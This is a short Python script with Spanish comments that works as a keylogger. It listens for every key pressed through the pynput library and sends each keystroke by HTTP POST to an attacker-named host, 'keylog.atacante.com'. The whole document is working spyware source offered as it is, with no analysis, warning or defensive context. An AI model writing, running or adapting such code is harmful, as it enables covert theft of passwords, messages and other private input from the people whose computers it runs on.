from pynput.keyboard import Listener
import requests

url = "https://keylog.atacante.com"

def on_press(key):
    try:
        key_pressed = str(key.char)  # Para teclas normales
    except AttributeError:
        key_pressed = str(key)  # Para teclas especiales (Shift, Enter, etc.)

    data = {'key': key_pressed}
    try:
        requests.post(url, data=data)
        print(f"Tecla presionada: {key_pressed}")
    except requests.exceptions.RequestException as e:
        print(f"Error al enviar datos: {e}")

# Iniciar el listener para el teclado
with Listener(on_press=on_press) as listener:
    listener.join()
